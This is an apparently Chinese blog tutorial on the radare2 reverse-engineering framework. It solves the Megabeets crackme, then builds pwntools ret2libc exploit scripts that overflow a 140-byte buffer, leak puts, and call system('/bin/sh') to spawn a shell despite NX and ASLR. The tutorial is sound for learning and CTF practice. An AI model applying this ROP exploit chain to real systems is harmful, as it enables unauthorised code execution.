@@ -1,0 +1,344 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Radare入门 | qianmu's blog</title><meta name="author" content="qianmu"><meta name="copyright" content="qianmu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Radare入门到进阶基本信息radare2是一个开源的逆向工程和二进制分析框架，包括反汇编、分析数据、打补丁、比较数据、搜索、替换、虚拟化等等，同时具备超强的脚本加载能力，它可以运行在几乎所有主流的平台（GNU&#x2F;Linux, .Windows *BSD, iOS, OSX, Solaris…）并且支持很多的cpu架构以及文件格式。 radare2工程是由一系列的组件构成，这些组件可以在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Radare入门">
+<meta property="og:url" content="https://qianmuoy.github.io/2024/03/01/Radare%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="qianmu&#39;s blog">
+<meta property="og:description" content="Radare入门到进阶基本信息radare2是一个开源的逆向工程和二进制分析框架，包括反汇编、分析数据、打补丁、比较数据、搜索、替换、虚拟化等等，同时具备超强的脚本加载能力，它可以运行在几乎所有主流的平台（GNU&#x2F;Linux, .Windows *BSD, iOS, OSX, Solaris…）并且支持很多的cpu架构以及文件格式。 radare2工程是由一系列的组件构成，这些组件可以在">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-03-01T08:43:19.000Z">
+<meta property="article:modified_time" content="2024-03-01T08:44:19.016Z">
+<meta property="article:author" content="qianmu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://qianmuoy.github.io/2024/03/01/Radare%E5%85%A5%E9%97%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Radare入门',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-01 16:44:19'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="qianmu's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="qianmu's blog"><span class="site-name">qianmu's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Radare入门</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-03-01T08:43:19.000Z" title="Created 2024-03-01 16:43:19">2024-03-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-03-01T08:44:19.016Z" title="Updated 2024-03-01 16:44:19">2024-03-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Radare入门"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Radare入门到进阶"><a href="#Radare入门到进阶" class="headerlink" title="Radare入门到进阶"></a>Radare入门到进阶</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>radare2是一个开源的逆向工程和二进制分析框架，包括反汇编、分析数据、打补丁、比较数据、搜索、替换、虚拟化等等，同时具备超强的脚本加载能力，它可以运行在几乎所有主流的平台（GNU&#x2F;Linux, .Windows *BSD, iOS, OSX, Solaris…）并且支持很多的cpu架构以及文件格式。 radare2工程是由一系列的组件构成，这些组件可以在 radare2 界面或者单独被使用–比如我们将要在接下来实验中使用到的rahash2, rabin2, ragg2三个组件，所有这些组件赋予了 radare2 强大的静态以及动态分析、十六进制编辑以及溢出漏洞挖掘的能力。</p>
+<p>Kali已经自带radare2</p>
+<p>我们可以输入-h查看帮助，i开头的命令主要用来获取各种信息，A系列的命令用于分析文件</p>
+<p><img src="/.io//image-20240210115155347.png" alt="image-20240210115155347"></p>
+<p><img src="/.io//image-20240210115210174.png" alt="image-20240210115210174"></p>
+<p><img src="/.io//image-20240210115224693.png" alt="image-20240210115224693"></p>
+<p>r2 框架里最强的一个工具 ：rabin2.</p>
+<p>rabin2 可以获取包括ELF, PE, Mach-O, Java CLASS文件的区段、头信息、导入导出表、字符串相关、入口点等等，并且支持几种格式的输出文件.我们可以使用它来获取二进制文件的基本信息</p>
+<p>输入man rabin2查看更多用法。对于反汇编，我们可以输入vv进入图形化界面。输入q则可以退出图形化界面，回到shell</p>
+<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>首先rabin2加上-I 参数 来让 rabin2 打印出二进制文件的系统属性、语言、字节序、框架、以及使用了哪些 加固技术</p>
+<p><img src="/.io//image-20240210115622138.png" alt="image-20240210115622138"></p>
+<p>我们可以看到这是一个32位的 elf 文件，没有剥离符号表并且是动态链接的</p>
+<p>接下来我们尝试运行它</p>
+<p><img src="/.io//image-20240210115723007.png" alt="image-20240210115723007"></p>
+<p>可以看到，不论是否加参数都会显示wrong。</p>
+<p>接下来我们使用radare2来进行破解。</p>
+<p><img src="/.io//image-20240210115845205.png" alt="image-20240210115845205"></p>
+<p>看到黄色字体输出了一个地址 (0x08048370)，这就是它自动识别的程序入口点，或者我们也可以使用ie命令手动打印出入口点。</p>
+<p>接下来输入aa或者aaa进行细致的分析</p>
+<p><img src="/.io//image-20240210115925640.png" alt="image-20240210115925640"></p>
+<p>分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 <flag spaces>，一个 flag 是所有类似特征的集合</flag></p>
+<p>接下来我们看看所有的flag</p>
+<p><img src="/.io//image-20240210115958812.png" alt="image-20240210115958812"></p>
+<p>我们打印出imports下面的信息</p>
+<p><img src="/.io//image-20240210120028466.png" alt="image-20240210120028466"></p>
+<p>为了获取更多的信息，我们可以再列出数据段里的字符串</p>
+<p><img src="/.io//image-20240210120055994.png" alt="image-20240210120055994"></p>
+<p>出现了关键字，一个是success，一个是我们之前运行时的wrong….。那我们接下来就跟着success走，看看哪儿进行了调用</p>
+<p>输入命令axt @@ str.*，并使用afl列出分析到的函数</p>
+<p>‘axt’ 命令用来在 data&#x2F;code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.</p>
+<p>‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）</p>
+<p>‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。</p>
+<p>接下来我们看看radare2分析出来哪些函数</p>
+<p><img src="/.io//image-20240210120506254.png" alt="image-20240210120506254"></p>
+<p>看到两个引起我们注意的sym.beet和sym.rot13</p>
+<p>接下来我们用 ‘s main’ 指令定位到main函数入口处，然后用 ‘pdf’输出反汇编代码</p>
+<p><img src="/.io//image-20240210120612639.png" alt="image-20240210120612639"></p>
+<p>分析函数的执行流程，我们知道二进制程序是通过获取 beet函数的返回结果来判断是否正确</p>
+<p>输入<a href="mailto:&#112;&#100;&#x66;&#64;&#x73;&#121;&#x6d;&#x2e;&#98;&#101;&#101;&#116;">&#112;&#100;&#x66;&#64;&#x73;&#121;&#x6d;&#x2e;&#98;&#101;&#101;&#116;</a>定位到反汇编</p>
+<p><img src="/.io//image-20240210120706294.png" alt="image-20240210120706294"></p>
+<p><img src="/.io//image-20240210120834756.png" alt="image-20240210120834756"></p>
+<p>我们看到输入的参数被拷贝到了一个缓存空间里，这个空间的地址是 ‘ebp – local_88h’ 。 ‘local_88h’ 就是十进制的 136。由于4个字节会被用来保存 ebp 的地址，4个字节被用来保存返回地址，所以这个缓冲区得大小是 128个字节.它们加起来刚好是 136. 我们输入的参数被拷贝到缓冲区后被用来和 sym.rot13的返回结果作对比， <strong>Rot-13</strong> 是一个著名的替换密码算法，在ctf和crackme中被广泛使用，这个函数接受了9个十六进制值作为参数，但是上图中看起来r2好像没有识别出来到底是什么字符，这里我们需要用 ‘ahi s’ 来做些处理。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ahi s @@=0x080485a3 0x080485ad 0x080485a7</span><br></pre></td></tr></table></figure>
+
+<p>ahi s 是用来设置字符串特定的偏移地址（使用 ahi? 获取更多用法），@@是一个迭代器，可以用来接受后面输入的多个参数,执行完这条命令后，图形视图会自动刷新。重新运行<a href="mailto:&#x70;&#100;&#x66;&#64;&#x73;&#121;&#109;&#x2e;&#98;&#x65;&#101;&#x74;">&#x70;&#100;&#x66;&#64;&#x73;&#121;&#109;&#x2e;&#98;&#x65;&#101;&#x74;</a></p>
+<p><img src="/.io//image-20240210121257193.png" alt="image-20240210121257193"></p>
+<p>可以看到之前无法识别的字符串’Megabeets’(根据字节序反向压栈顺序得到)。这个二进制文件将我们传入的参数来和经过 rot13 处理后的 ‘Megabeets’ 作比较</p>
+<p>接下来我们通过rahash2求出这个字符串的校验值</p>
+<p><img src="/.io//image-20240210121407504.png" alt="image-20240210121407504"></p>
+<p>至此，程序的逻辑就很清楚了：</p>
+<p>‘Zrtnorrgf’ 就是用来和我们输入的字符串作比较，成功则返回success</p>
+<p>接下来输入ood?进入调试模式</p>
+<p>将Zrtnorrgf作为参数进行调试</p>
+<p>输入dc查看结果</p>
+<p><img src="/.io//image-20240210121546310.png" alt="image-20240210121546310"></p>
+<p>输出了success，我们成功破解了这个小软件，也借此掌握了radare2的基本用法</p>
+<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>常用命令：</p>
+<p>   信息搜集:</p>
+<p>​    $ rabin2 -I .&#x2F;program — 查看二进制信息</p>
+<p>   ii [q] – 查看导出表</p>
+<p>   ?v sym.imp.func_name — 获取过程链接表中相应函数的地址（func_name@PLT）</p>
+<p>   ?v reloc.func_name —获取全局偏移表中函数的地址（func_name@GOT）</p>
+<p>   ie [q] — 获取入口点地址</p>
+<p>   内存相关：</p>
+<p>   dmm — 列出模块 (库文件，内存中加载的二进制文件)</p>
+<p>   dmi [addr|libname] [symname] — 列出目标库的符号标识</p>
+<p>   搜索：</p>
+<p>   &#x2F;?— 列出搜索子命令 </p>
+<p>   &#x2F; string — 搜索内存&#x2F;二进制文件的字符串</p>
+<p>   &#x2F;R [?] —搜索ROP gadgets</p>
+<p>   &#x2F;R&#x2F; — 使用正则表达式搜索ROP gadgets</p>
+<p>   调试：</p>
+<p>   dc — 继续执行</p>
+<p>   dcu addr – 继续执行直到到达指定地址</p>
+<p>   dcr — 继续执行直到到达ret (使用步过step over)</p>
+<p>   dbt [?] —基于 dbg.btdepth 和 dbg.btalgo显示backtrace追踪函数</p>
+<p>   doo [args] — 添加参数重新打开调试模式</p>
+<p>   ds — 步入一条指令（step on）</p>
+<p>   dso — 步过（Step over）</p>
+<p>Visual Modes</p>
+<p>   pdf @ addr — 打印出相应偏移处的函数的汇编代码</p>
+<p>   V —视图模式,使用p&#x2F;P to在不同模式间切换</p>
+<p>本实验的重点是exp的开发，将使用radare 2绕过启用ASLR的系统上的NX保护的二进制文件，并进行exp的开发。</p>
+<p>拿到小程序后，我们首先使用rabin2查看文件相关信息</p>
+<p><img src="/.io//image-20240210122304648.png" alt="image-20240210122304648"></p>
+<p>由上图可以看到二进制文件是NX保护的，这意味着我们不会有一个可执行的堆栈依赖。这就加大了我们写exp的难度，同样，这也给我们的学习与挑战带来了乐趣。</p>
+<p>现在我们来看看程序的反汇编。我们先以调试模式打开，然后对符号、函数进行分析</p>
+<p><img src="/.io//image-20240210122829057.png" alt="image-20240210122829057"></p>
+<p> 接下来继续执行，直到到达main函数</p>
+<p><img src="/.io//image-20240210122854521.png" alt="image-20240210122854521"></p>
+<p>  接下来我们使用vv进入图形化模式</p>
+<p><img src="/.io//image-20240210123817194.png" alt="image-20240210123817194"></p>
+<p>   我们可以看到main()函数中通过scanf()帮助我们输入，然后将输入值传递给sym.beet，因此定位到处理我们输入的beet函数。按q退出vv模式</p>
+<p><img src="/.io//image-20240210123158664.png" alt="image-20240210123158664"></p>
+<p> 我们可以看到，用户的输入[arg_8h]被复制到了缓冲区[local_88h]，然后正如我们在上一个radare2入门实验中看到的一样,字符串Megabeets将会通过rot13加密，加密后的结果将会与我们的输入进行比较。</p>
+<p>此处存在的漏洞是：程序不检查输入的大小，并将输入复制到缓冲区。这意味着，如果我们输入一个大于缓冲区大小的输入，就会导致缓冲区溢出并破坏堆栈</p>
+<p>接下来我们来看看我们的exp该怎么编写。</p>
+<p>   我们的目标是在系统上得到一个shell。首先，我们需要验证确实存在一个易受攻击的函数，然后，我们将找到有效负载覆盖堆栈的偏移量。</p>
+<p>   我们使用radare2的一个框架ragg2, ragg2允许我们生成一个名为deBruijn序列的循环模式，并检查有效负载覆盖缓冲区的确切偏移量。</p>
+<p><img src="/.io//image-20240210124026111.png" alt="image-20240210124026111"></p>
+<p> 接下来我们要做三件事情：</p>
+<p>   1.使用ragg2将De Bruijn模式的文件写入</p>
+<p>   2.创建rarun2配置文件和设置输出文件作为标准输入</p>
+<p>vim profile.rr2</p>
+<p><img src="/.io//image-20240210124258237.png" alt="image-20240210124258237"></p>
+<p>   3.让radare2自动找到偏移值</p>
+<p><img src="/.io//image-20240210124743090.png" alt="image-20240210124743090"></p>
+<p>我们执行了我们的二进制文件，并通过rarun2传递了pattern.txt的内容到stdin，并收到了信号量11</p>
+<p><img src="/.io//image-20240210124819281.png" alt="image-20240210124819281"></p>
+<p>我们注意到提示指向0x41417641？这是一个无效的地址，代表“AvAA”（ascii），这是我们前面生成的模式的一部分。</p>
+<p><img src="/.io//image-20240210125135227.png" alt="image-20240210125135227"></p>
+<p>由上图可以知道140个字节后将会出现返回地址的覆盖，我们可以开始制作我们的payload了。</p>
+<p>前面提到我们的机器受ASLR保护所以我们不能预测地址，libc将加载到内存并且地址会发生变换。此外，我们的二进制程序开启NX，这意味着栈是不可执行的，我们不能仅仅把shellcode写入堆栈，跳转到它来执行。虽然这些保护阻止我们使用一些技术开发exp，但它们并不是绝对有效的，我们可以很容易地制造出其他的payload绕过它们</p>
+<p>   我们再次以调试模式打开二进制文件，并查看库和它使用的函数。</p>
+<p><img src="/.io//image-20240210125246324.png" alt="image-20240210125246324"></p>
+<p>我们已经看到了puts和scanf了，我们可以利用这两个函数来创建一个完美的漏洞。我们的exp的编写基于以下的逻辑：我们可以控制该程序的流程，将尝试执行系统（“&#x2F;bin&#x2F;sh”）从而弹出一个shell。</p>
+<p>因此我们需要完成以下几件事情：</p>
+<p>   1.泄露puts的真实地址</p>
+<p>   2.计算libc的基址</p>
+<p>   3.计算system的地址</p>
+<p>   4.找到包含&#x2F;bin&#x2F;sh字符串的libc的地址</p>
+<p>   5.使用&#x2F;bin&#x2F;sh进行系统调用，并且拿到shell</p>
+<p> 先来看看我们exp的框架（exploit1.py）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#Add</span></span><br><span class="line">puts_plt = </span><br><span class="line">puts_got = </span><br><span class="line">entry_point = </span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#open process</span></span><br><span class="line">    p = process(<span class="string">&quot;./megabeets_0x2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line">    ropchain = p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line">   	payload = payload + ropchain</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">&quot;puts is at: 0x%x&quot;</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们需要填入的就是puts_plt , puts_got , entry_point 三个地址</p>
+<p>我们将利用radare2找到这三个地址</p>
+<p><img src="/.io//image-20240210133151857.png" alt="image-20240210133151857"></p>
+<p>?v sym.imp.puts命令的意思是获取puts函数在PLT中的地址，接下来获取puts_20在GOT中的地址与程序入口</p>
+<p><img src="/.io//image-20240210133348092.png" alt="image-20240210133348092"></p>
+<p>填入exp，执行</p>
+<p><img src="/.io//image-20240210133613652.png" alt="image-20240210133613652"></p>
+<p>我们执行了三遍，可以看到每次执行后的puts的地址都会发生变化。因此我们不能提前预测地址。现在我们需要找到puts在libc中的偏移，然后计算lib的基址。之后我们根据基址然后使用对应的偏移来计算出system,exit,”&#x2F;bin&#x2F;sh”的真实地址。</p>
+<p>Exp（exploit.py）的框架是这样的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#Add</span></span><br><span class="line">puts_plt = </span><br><span class="line">puts_got = </span><br><span class="line">entry_point = </span><br><span class="line"></span><br><span class="line"><span class="comment">#Offsets</span></span><br><span class="line">offset_puts = </span><br><span class="line">offset_system = </span><br><span class="line">offset_exit = </span><br><span class="line">offset_str_bin_sh = </span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#open process</span></span><br><span class="line">    p = process(<span class="string">&quot;./megabeets_0x2&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line">    ropchain = p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line">   	payload = payload + ropchain</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">&quot;puts is at: 0x%x&quot;</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">&quot;libc base: 0x%x&quot;</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    exit_addr = libc_base + offset_exit</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">&quot;system is at: 0x%x&quot;</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;/bin/sh is at: 0x%x&quot;</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">&quot;exit is at: 0x%x&quot;</span> % exit_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#build 2nd payload</span></span><br><span class="line">    payload2 = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line">    ropchain2 = p32(system_addr)</span><br><span class="line">    ropchain2 += p32(exit_addr)</span><br><span class="line">    ropchain2 += p32(binsh_addr)</span><br><span class="line">    payload2 = payload2 + ropchain2</span><br><span class="line">    p.sendline(payload2)   </span><br><span class="line">    </span><br><span class="line">    log.success(<span class="string">&quot;Here comes the shell!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们接下来的任务就是使用radare2找到偏移量</p>
+<p><img src="/.io//image-20240210134908119.png" alt="image-20240210134908119"></p>
+<p><img src="/.io//image-20240210135734579.png" alt="image-20240210135734579"></p>
+<p><img src="/.io//image-20240210135759122.png" alt="image-20240210135759122"></p>
+<p>填充后，成功拿到shell</p>
+<p><img src="/.io//image-20240210140034709.png" alt="image-20240210140034709"></p>
+<p>我们回顾下这次实验中是如何pwn的：</p>
+<p>   主要分为两个阶段。</p>
+<p>   第一个阶段，我们需要：140字节的填充，PLT中puts的地址，入口点，GOT中puts的地址。</p>
+<p>   目的：泄露puts的地址。通过多次执行，发现中put的地址是改变的，即我们事先不能预测它的地址，所以为了获取真实地址我们必须通过偏移量，基址进行计算得到。</p>
+<p>   对应我们的脚本 exploit1.py</p>
+<p>   第二个阶段，我们需要：140字节的填充，system@libc,exit@libc,&#x2F;bin&#x2F;sh地址</p>
+<p>   对应我们的脚本exploit.py</p>
+<p>   目的：计算偏移，基址获取关键函数的真实地址，从而系统调用拿到shell</p>
+<p>   总结一下，关键的步骤：多次泄露puts的地址-》发现地址随机，无法事先预测地址-》计算偏移，基址来获取关键函数调用真实地址-》拿到shell</p>
+<h2 id="进阶-1"><a href="#进阶-1" class="headerlink" title="进阶"></a>进阶</h2><p>本实验旨在通过radare2来解决GameBoy ROM挑战的一个项目：simple.gb</p>
+<p>首先我们在radare2打开二进制文件，检查它的架构、格式（i命令给出关于二进制文件的信息，~是r2内部的grep命令）</p>
+<p><img src="/.io//image-20240210141758683.png" alt="image-20240210141758683"></p>
+<p>由上图可以看出这是一个GameBoy的ROM，那么在阅读了它的一些指令集之后我们该去完成这次挑战了</p>
+<p>安装模拟器并测试，发现失败后有字符FAIL</p>
+<p>回到kali，查看FAIL地址（izzq会打印出存在于整个二进制文件中的字符串）</p>
